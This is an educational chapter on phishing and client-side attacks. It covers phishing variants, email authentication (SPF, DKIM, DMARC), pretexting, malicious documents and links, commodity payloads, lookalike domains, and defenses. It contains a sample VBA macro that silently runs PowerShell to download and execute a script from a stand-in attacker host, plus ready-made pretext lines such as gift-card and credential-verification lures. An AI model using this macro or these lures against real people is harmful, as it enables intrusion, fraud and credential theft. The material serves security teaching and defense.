# Client-Side Attacks and Phishing

Firewalls, network segmentation, patched servers: all of these are genuinely harder to get through than they used to be. So attackers go around them. The human being sitting at a workstation inside the network perimeter is, for most organizations, the path of least resistance. They can be deceived into clicking a link, opening a file, or handing over credentials. The technical defenses don't matter if you can get a user to defeat them from the inside.

This is the premise of client-side attacks, and phishing is the delivery mechanism for most of them.

---

## Phishing Variants

"Phishing" has become an umbrella term. The variants matter because they require different defenses.

**Phishing (bulk):** Mass email campaigns targeting large numbers of recipients with a generic lure. Low effort, lower success rate per target, but the numbers make it worthwhile. Nigerian prince-style fraud lives here, but so do credential harvest campaigns against corporate O365 tenants.

**Spear phishing:** Targeted at a specific individual or small group. The attacker researches the target, references real projects, colleagues' names, recent events. Much higher success rate. This is what APTs and sophisticated criminal groups use for initial access.

**Whaling:** Spear phishing aimed at executives (CEOs, CFOs, board members). The goal is often business email compromise or authorization of fraudulent wire transfers. Executives make attractive targets because they have authority to approve large transactions and sometimes receive less security scrutiny, not more.

**Vishing (voice phishing):** Phone-based social engineering. Impersonating IT helpdesk, banks, or government agencies to extract credentials or authorize account changes. Effective because people are conditioned to trust voice calls in ways they've been trained not to trust emails.

**Smishing (SMS phishing):** Malicious links or instructions delivered via text message. The shorter format limits context, but the click rates on SMS links are reportedly higher than email. Package delivery notifications are a common lure.

**Business Email Compromise (BEC):** Not quite phishing in the traditional sense, but deeply related. The attacker either compromises a real email account or creates a convincing lookalike domain, then uses it to request wire transfers, change payment details on invoices, or redirect payroll. FBI IC3 data consistently ranks BEC as one of the highest-dollar cybercrime categories.

---

## What Makes Phishing Work

The psychological levers are well-documented, and they don't really change:

**Urgency:** "Your account will be suspended in 24 hours." "Immediate action required." Urgency bypasses deliberate thinking and pushes people toward quick compliance.

**Authority:** Impersonating IT support, a manager, the CEO, a regulatory body. People comply with perceived authority figures. The attacker doesn't need to be legitimate; they need to seem legitimate.

**Familiarity:** Using the target's name, referencing their company, their colleagues, a project they're working on. Familiarity reduces suspicion. This is why spear phishing is so much more effective than bulk phishing.

**Fear:** "Your computer has a virus." "You're under investigation." Fear clouds judgment and motivates action before thinking.

**Social proof:** "All employees were required to complete this form." Conformity is a powerful motivator in corporate environments.

A well-crafted phishing email stacks several of these at once. An email that appears to come from IT, addressed to you by name, warning urgently that your credentials have been compromised and you need to reset your password immediately, hits authority, familiarity, urgency, and fear simultaneously.

---

## Email Spoofing and Email Authentication

One of the first questions people ask: how can an attacker send email that appears to come from your company's domain? The answer is that SMTP, the protocol that routes email, was designed in 1982 with essentially no authentication. Anyone can send an email claiming to be from anyone. Three mechanisms have been built on top of SMTP to address this, and their adoption is still incomplete.

### SPF (Sender Policy Framework)

SPF is a DNS TXT record that lists the IP addresses and mail servers authorized to send email on behalf of a domain.

```
v=spf1 include:_spf.google.com ip4:203.0.113.5 ~all
```

When a receiving mail server gets an email claiming to be from `company.com`, it looks up the SPF record for `company.com` and checks whether the sending server's IP is on the list. If not, the email fails SPF.

The limitation: SPF checks the "envelope from" (the technical sender used in the SMTP session), not the "From" header that users see. An attacker can pass SPF while still spoofing the visible From address, depending on the mail client and configuration.

The `~all` at the end means "soft fail": accept but mark. `-all` means hard fail: reject. Many organizations use `~all` out of caution, which means SPF failures often don't result in rejection.

### DKIM (DomainKeys Identified Mail)

DKIM adds a cryptographic signature to outgoing emails. The sending server signs the message with a private key. The public key is published in DNS. Receiving servers verify the signature against the DNS record.

If the email is modified in transit (content changed, headers altered), the signature breaks. DKIM provides integrity guarantees that SPF doesn't. It also survives forwarding in ways that SPF doesn't (forwarded email usually changes the sending IP, breaking SPF).

A DKIM signature in an email header looks like:
```
DKIM-Signature: v=1; a=rsa-sha256; d=company.com; s=selector1;
    h=from:to:subject:date; bh=base64hash; b=base64signature
```

### DMARC (Domain-based Message Authentication, Reporting and Conformance)

DMARC ties SPF and DKIM together and adds a policy for what to do when they fail. It's published as a DNS TXT record at `_dmarc.domain.com`:

```
v=DMARC1; p=reject; rua=mailto:dmarc@company.com; ruf=mailto:dmarc@company.com; pct=100
```

The `p=` value is the policy:
- `none`: monitor only, don't take action. Useful for initial rollout.
- `quarantine`: send failing emails to spam.
- `reject`: refuse delivery entirely.

DMARC also requires alignment: the domain in the From header must match the domain that passed SPF or DKIM. This closes the loophole where SPF passes but the visible From is spoofed.

When any of these are missing or misconfigured, spoofing becomes easier. A domain with no DMARC record or `p=none` can be spoofed and the mail will likely be delivered. Many smaller organizations and third-party vendors fall into this category, making them useful for impersonation.

---

## Pretexting

Pretexting is the construction of a fabricated scenario (a pretext) to manipulate a target. The email or call doesn't stand alone; it's part of a believable story.

Common pretexts in corporate environments:

- **IT helpdesk:** "We've detected unusual activity on your account and need to verify your credentials."
- **External vendor:** "I'm following up on the invoice we sent last month. Here's the updated payment details."
- **Executive assistant:** "The CEO needs you to purchase gift cards urgently for a client. Please keep this confidential."
- **HR:** "Please review and sign the attached updated benefits document before the deadline."
- **Security team:** "We're conducting a mandatory security awareness verification. Please click the link to complete your assessment."

The more targeted and researched the pretext, the more effective it is. LinkedIn, company websites, and press releases provide the raw material for constructing plausible scenarios. Job postings are surprisingly useful: they reveal internal tools, team structures, and ongoing projects.

---

## Malicious Documents

Office documents (Word, Excel, PowerPoint) have been an attack vector for decades, primarily via VBA macros.

**How the macro execution chain works:**

1. The victim receives a `.docm` or `.xlsm` file (or a `.doc/.xls` with an embedded macro).
2. The document prompts them to "Enable Content" to view it properly.
3. If they click Enable, the VBA macro runs. This is arbitrary code execution in the context of the user's account.
4. The macro typically downloads and executes a second-stage payload: a Meterpreter stager, a PowerShell script, a legitimate remote administration tool.

```vba
' Simplified example of what a malicious macro might do
Sub AutoOpen()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell.exe -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"""
End Sub
```

The PowerShell one-liner downloads and executes a script in memory without writing to disk, which helps evade filesystem-based detection.

**Mark of the Web (MOTW):** Windows applies a Zone Identifier tag to files downloaded from the internet. Office respects this by opening files in Protected View (read-only, macros disabled). This is a meaningful defense. Files downloaded from email attachments, web browsers, or cloud storage will have MOTW applied. Delivering documents via password-protected archives can sometimes bypass MOTW because the zip extraction may not propagate the tag to extracted files, though this behavior has been patched in Windows 11 22H2 (CVE-2022-41049).

Beyond macros: `.lnk` shortcut files, HTA (HTML Application) files, ISO images containing executables, and Office templates are all used as alternative document-based delivery mechanisms when macro execution is more tightly controlled.

---

## Malicious Links

Not all phishing requires an attachment. A link to a controlled page is often cleaner.

**Credential harvesting:** A replica of a login page (O365, VPN portal, Webmail) that captures entered credentials and forwards them to the attacker. The victim is usually then redirected to the real login page, so they don't notice anything wrong. Tools like GoPhish for campaign management and Evilginx2 for reverse-proxy-based harvesting (which can capture session cookies and bypass MFA) are commonly used.

**Browser exploits:** Rarer and more expensive than they used to be, but still possible. A link that delivers a browser exploit chain can result in code execution with no user interaction beyond visiting the page. These are typically reserved for targeted, high-value attacks because the exploits are costly and burn quickly.

**OAuth / Consent phishing:** An increasingly common technique. Instead of stealing a password, the attacker gets the victim to authorize a malicious OAuth application to access their account. The link leads to a legitimate OAuth consent screen (Microsoft, Google) asking the victim to grant permissions to an application that looks innocuous. If approved, the attacker gets an access token with the granted permissions, and MFA is irrelevant because no password was ever entered. Revocation requires finding and removing the authorized application from the account.

---

## Payloads Delivered via Phishing

Phishing is usually stage one. The goal is often to get something running on the victim's machine.

**RATs (Remote Access Trojans):** Give the attacker a persistent remote connection: file system access, webcam/mic, keylogging, lateral movement capability. AsyncRAT, NjRAT, QuasarRAT are commonly seen in the wild.

**Keyloggers:** Record keystrokes, capturing credentials entered into any application. Often bundled with credential stealers that target browser-saved passwords and application credentials.

**Ransomware droppers:** The phishing email isn't the ransomware itself; it's the initial access. The dropper establishes a foothold, exfiltrates data, and then deploys ransomware across the network. The initial email might arrive weeks or months before encryption begins.

**Stealers:** Tools like RedLine, Raccoon, and Vidar are commodity stealers sold as a service. They grab browser credentials, cookies, crypto wallets, and Discord tokens, then exfiltrate them. Often distributed via phishing campaigns.

---

## Infrastructure

Sophisticated phishing campaigns don't use obvious attacker infrastructure.

**Lookalike domains:** Domains that resemble legitimate ones at a glance. Common techniques include:
- Typosquatting: `microsft.com`, `googIe.com` (capital I instead of lowercase l)
- Homoglyph attacks: using Unicode characters that look like ASCII (`pаypal.com` with a Cyrillic 'а')
- Subdomain tricks: `paypal.com.attacker.net` (the actual domain is `attacker.net`)
- Keyword addition: `microsoft-support.net`, `paypal-security.com`

**Fast flux:** DNS records for phishing domains are updated very rapidly, rotating through many IP addresses. This makes takedown harder because blocklists can't keep up with the changing IPs, and the hosting is distributed across many compromised systems.

**Email headers to inspect when analyzing suspicious email:**

| Header | What to check |
|--------|--------------|
| `Received:` | Trace the actual routing path. The bottom entry is the origin. |
| `Return-Path:` | Where bounce messages go. Should match the From domain. |
| `X-Originating-IP:` | Sometimes reveals the true sending IP. |
| `Authentication-Results:` | Shows SPF, DKIM, and DMARC pass/fail results as evaluated by the receiving server. |
| `Message-ID:` | The domain in the Message-ID should match the sending domain. Mismatches are suspicious. |
| `Reply-To:` | If this differs from the From address, replies go somewhere else. Common in BEC. |

---

## Defense

**Email filtering and sandboxing:** Gateway-level filtering catches bulk phishing and known malicious attachments. Sandboxing detonates attachments in an isolated environment before delivering them. Neither is perfect, but both raise the bar significantly.

**DMARC enforcement:** Publish DMARC with `p=reject` for your own domains. This prevents attackers from spoofing your domain to your own employees (and to the outside world). Start with `p=none` to gather reporting data, then move to `quarantine` and finally `reject` as you verify your legitimate mail sources are all properly configured.

**Disable macros by default:** Microsoft has made significant changes here: as of 2022, Office blocks macros in files downloaded from the internet by default. This is one of the most impactful policy changes Microsoft has made in years. Ensure this isn't overridden by Group Policy in your environment, and disable macros entirely in departments that don't need them.

**MFA:** Even when phishing succeeds and credentials are captured, MFA prevents their immediate use. This is why consent phishing and Evilginx-style session cookie theft have become more common: they're designed to work around MFA. Phishing-resistant MFA (hardware security keys, passkeys) goes further by cryptographically binding the authentication to the legitimate site, making credential-harvesting pages useless.

**User training:** Security awareness training gets a lot of skepticism, some of it warranted. Click-through training videos have minimal impact. Simulated phishing campaigns with immediate, contextual feedback ("you just clicked a simulated phishing link, here's what to look for") are more effective, though the research on long-term behavior change is mixed. The more useful framing: train users to report suspicious emails, not just to avoid them. A user who forwards a phishing email to the security team is more valuable than one who silently deletes it.

**Incident response playbooks for phishing:** Define in advance what happens when phishing is reported. Who investigates? What's the process for determining if credentials were entered? How quickly can a compromised account be locked? The effectiveness of phishing defense is as much about response speed as it is about prevention.
